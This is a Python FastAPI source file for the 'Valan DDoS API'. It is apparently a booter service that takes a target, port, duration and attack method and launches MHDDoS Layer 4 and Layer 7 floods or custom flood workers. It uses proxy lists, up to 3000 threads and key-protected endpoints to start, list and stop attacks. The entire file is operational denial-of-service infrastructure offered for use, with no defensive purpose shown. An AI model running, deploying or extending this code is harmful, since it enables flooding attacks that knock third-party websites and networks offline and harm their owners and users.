# api_server.py
import asyncio
import sys
import time
import uuid
import threading
from typing import Optional

from fastapi import FastAPI, HTTPException, Query
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

from config import (
    MAX_CONC, L7_METHODS, L4_METHODS, CUSTOM_METHODS,
    MHDDOS_DIR, PROXY_FILE, DB_PATH, PUBLIC_BASE,
)
from custom_methods import get_custom, HAS_CURL_CFFI
from database import Database

DEFAULT_THREADS = 150
RPC = 128
ALL_METHODS = L7_METHODS + L4_METHODS + CUSTOM_METHODS

JOBS: dict = {}
LOCK = threading.Lock()
DB = Database(DB_PATH)
START_TIME = time.time()

app = FastAPI(title="Valan DDoS API", version="3.1")


class AttackRequest(BaseModel):
    method: str
    target: str
    port: int = 80
    duration: int = 60
    threads: Optional[int] = None


class StopRequest(BaseModel):
    job_id: str


def _count():
    with LOCK:
        return len(JOBS)


def build_cmd(method, target, port, duration, threads):
    if method in L7_METHODS:
        url = target if target.startswith("http") else f"http://{target}"
        if port and ":" not in url.split("//")[-1]:
            url = f"{url}:{port}"
        return [sys.executable, "start.py", method, url, "5", str(threads),
                PROXY_FILE, str(RPC), str(duration)]
    host = target.split("//")[-1].split("/")[0].split(":")[0]
    return [sys.executable, "start.py", method, f"{host}:{port}",
            str(threads), str(duration)]


async def run_mhddos(jid, method, target, port, dur, threads):
    cmd = build_cmd(method, target, port, dur, threads)
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, cwd=MHDDOS_DIR,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
    except Exception as e:
        print(f"[JOB {jid}] spawn fail: {e}")
        with LOCK:
            JOBS.pop(jid, None)
        return
    with LOCK:
        if jid in JOBS:
            JOBS[jid]["proc"] = proc
    await proc.wait()
    with LOCK:
        JOBS.pop(jid, None)


async def run_custom(jid, method, target, port, dur, threads):
    stats = {"hits": 0, "errors": 0}
    host = target.split("//")[-1].split("/")[0].split(":")[0]
    cls = get_custom(method)
    if not cls:
        with LOCK:
            JOBS.pop(jid, None)
        return
    worker = cls(host, port, dur, threads, stats)
    with LOCK:
        if jid in JOBS:
            JOBS[jid]["worker"] = worker
            JOBS[jid]["stats"] = stats
    try:
        await worker.run()
    except Exception as e:
        print(f"[JOB {jid}] custom err: {e}")
    finally:
        with LOCK:
            JOBS.pop(jid, None)


# ═══════════════════════════════════════════
# HTML Status Page — หน้าแรกของ API
# ═══════════════════════════════════════════
@app.get("/", response_class=HTMLResponse)
async def index():
    uptime = int(time.time() - START_TIME)
    h = uptime // 3600
    m = (uptime % 3600) // 60
    s = uptime % 60

    return f"""<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Valan DDoS API</title>
<style>
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{
    background: #0a0a0a;
    color: #e8e8e8;
    font-family: -apple-system, 'Segoe UI', 'Helvetica Neue', sans-serif;
    min-height: 100vh;
    padding: 48px 20px;
    display: flex;
    justify-content: center;
  }}
  .wrap {{ width: 100%; max-width: 560px; }}
  .header {{ margin-bottom: 32px; text-align: center; }}
  h1 {{
    font-size: 28px; font-weight: 700; color: #ffffff;
    margin-bottom: 8px; letter-spacing: -0.5px;
  }}
  .tagline {{ color: #6a6a6a; font-size: 14px; }}
  .card {{
    background: #121212;
    border: 1px solid #1f1f1f;
    border-radius: 14px;
    padding: 20px 22px;
    margin-bottom: 14px;
  }}
  .card h2 {{
    font-size: 11px; font-weight: 600; color: #666;
    text-transform: uppercase; letter-spacing: 1.2px;
    margin-bottom: 14px;
  }}
  .row {{
    display: flex; justify-content: space-between;
    align-items: center; padding: 10px 0;
    border-bottom: 1px solid #191919;
    font-size: 14px;
  }}
  .row:last-child {{ border-bottom: none; }}
  .label {{ color: #808080; }}
  .value {{ color: #ffffff; font-weight: 600; }}
  .online {{
    color: #4ade80;
    display: inline-flex; align-items: center; gap: 6px;
  }}
  .online::before {{
    content: '';
    width: 8px; height: 8px; border-radius: 50%;
    background: #4ade80;
    box-shadow: 0 0 10px #4ade80;
    animation: pulse 2s infinite;
  }}
  @keyframes pulse {{
    0%, 100% {{ opacity: 1; }}
    50% {{ opacity: 0.5; }}
  }}
  .mono {{
    font-family: 'SF Mono', Menlo, Consolas, monospace;
    background: #0d0d0d; padding: 3px 8px;
    border-radius: 6px; font-size: 12px;
    color: #a0a0a0; border: 1px solid #1a1a1a;
  }}
  .footer {{
    text-align: center; margin-top: 24px;
    font-size: 11px; color: #404040;
  }}
</style>
</head>
<body>
<div class="wrap">
  <div class="header">
    <h1>Valan DDoS API</h1>
    <p class="tagline">Multi-vector high-performance API</p>
  </div>

  <div class="card">
    <h2>System</h2>
    <div class="row">
      <span class="label">Status</span>
      <span class="value online">Online</span>
    </div>
    <div class="row">
      <span class="label">Uptime</span>
      <span class="value">{h}h {m}m {s}s</span>
    </div>
    <div class="row">
      <span class="label">Version</span>
      <span class="value">3.1</span>
    </div>
  </div>

  <div class="card">
    <h2>Capacity</h2>
    <div class="row">
      <span class="label">Concurrent limit</span>
      <span class="value">{MAX_CONC}</span>
    </div>
    <div class="row">
      <span class="label">Active jobs</span>
      <span class="value">{_count()}</span>
    </div>
    <div class="row">
      <span class="label">Total methods</span>
      <span class="value">{len(ALL_METHODS)}</span>
    </div>
  </div>

  <div class="card">
    <h2>Methods</h2>
    <div class="row">
      <span class="label">Layer 7</span>
      <span class="value">{len(L7_METHODS)}</span>
    </div>
    <div class="row">
      <span class="label">Layer 4</span>
      <span class="value">{len(L4_METHODS)}</span>
    </div>
    <div class="row">
      <span class="label">Custom</span>
      <span class="value">{len(CUSTOM_METHODS)}</span>
    </div>
  </div>

  <div class="card">
    <h2>Usage</h2>
    <div class="row">
      <span class="label">Attack</span>
      <span class="mono">GET /attack?key=...&amp;target=...&amp;method=...</span>
    </div>
    <div class="row">
      <span class="label">Status</span>
      <span class="mono">GET /status?key=...</span>
    </div>
    <div class="row">
      <span class="label">Methods</span>
      <span class="mono">GET /methods?key=...</span>
    </div>
  </div>

  <div class="footer">Valan DDoS API &middot; v3.1</div>
</div>
</body>
</html>"""


@app.on_event("startup")
async def _startup():
    await DB.init()
    owner_key = await DB.ensure_owner_key()
    print(f"[API] owner key = {owner_key}")
    print(f"[API] {len(ALL_METHODS)} methods | max {MAX_CONC} concurrent")


# ═══════════════════════════════════════════
# API Endpoints
# ═══════════════════════════════════════════
@app.get("/api")
def api_info():
    return {"name": "Valan DDoS API", "version": "3.1",
            "active": _count(), "max": MAX_CONC,
            "methods": len(ALL_METHODS),
            "curl_cffi": HAS_CURL_CFFI}


@app.get("/methods")
async def methods(key: str = Query("")):
    if not await DB.check_key(key):
        raise HTTPException(403, "invalid key")
    return {"l7": L7_METHODS, "l4": L4_METHODS, "custom": CUSTOM_METHODS,
            "total": len(ALL_METHODS)}


@app.get("/status")
async def status(job_id: str = None, key: str = Query("")):
    if not await DB.check_key(key):
        raise HTTPException(403, "invalid key")
    with LOCK:
        if job_id:
            j = JOBS.get(job_id)
            if not j:
                return {"exists": False, "job_id": job_id}
            e = {"job_id": job_id, "method": j["method"], "target": j["target"],
                 "port": j["port"], "duration": j["duration"],
                 "elapsed": int(time.time() - j["started"]),
                 "hits": 0, "errors": 0}
            s = j.get("stats")
            if s:
                e["hits"] = s.get("hits", 0)
                e["errors"] = s.get("errors", 0)
            return e
        jobs = [{"job_id": k, "method": v["method"], "target": v["target"],
                 "elapsed": int(time.time() - v["started"]),
                 "hits": (v.get("stats") or {}).get("hits", 0)}
                for k, v in JOBS.items()]
    return {"active": len(jobs), "max": MAX_CONC, "jobs": jobs}


@app.post("/attack")
async def attack(req: AttackRequest, key: str = Query("")):
    if not await DB.check_key(key):
        raise HTTPException(403, "invalid key")
    method = req.method.upper()
    if method not in ALL_METHODS:
        raise HTTPException(400, f"unknown method: {method}")
    if _count() >= MAX_CONC:
        raise HTTPException(429, f"max concurrent {MAX_CONC}")
    if not (1 <= req.duration <= 3600):
        raise HTTPException(400, "duration 1-3600")
    threads = req.threads or DEFAULT_THREADS
    if not (10 <= threads <= 3000):
        raise HTTPException(400, "threads 10-3000")

    jid = uuid.uuid4().hex[:12]
    with LOCK:
        JOBS[jid] = {"job_id": jid, "method": method, "target": req.target,
                     "port": req.port, "duration": req.duration,
                     "threads": threads, "started": time.time(),
                     "proc": None, "worker": None, "stats": None}

    if method in CUSTOM_METHODS:
        asyncio.create_task(run_custom(jid, method, req.target, req.port,
                                       req.duration, threads))
    else:
        asyncio.create_task(run_mhddos(jid, method, req.target, req.port,
                                       req.duration, threads))

    return {"success": True, "status": "Attack Sent", "job_id": jid,
            "method": method, "target": req.target, "port": req.port,
            "duration": req.duration, "threads": threads, "active": _count()}


@app.post("/stop")
async def stop(req: StopRequest, key: str = Query("")):
    if not await DB.check_key(key):
        raise HTTPException(403, "invalid key")
    with LOCK:
        j = JOBS.pop(req.job_id, None)
    if not j:
        raise HTTPException(404, "not found")
    p = j.get("proc")
    if p and p.returncode is None:
        try: p.terminate()
        except Exception: pass
    w = j.get("worker")
    if w:
        try: w.stop()
        except Exception: pass
    return {"success": True}


@app.post("/stop-all")
async def stop_all(key: str = Query("")):
    if not await DB.check_key(key):
        raise HTTPException(403, "invalid key")
    with LOCK:
        jobs = list(JOBS.values())
        JOBS.clear()
    for j in jobs:
        p = j.get("proc")
        if p and p.returncode is None:
            try: p.terminate()
            except Exception: pass
        w = j.get("worker")
        if w:
            try: w.stop()
            except Exception: pass
    return {"success": True, "stopped": len(jobs)}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000, log_level="warning")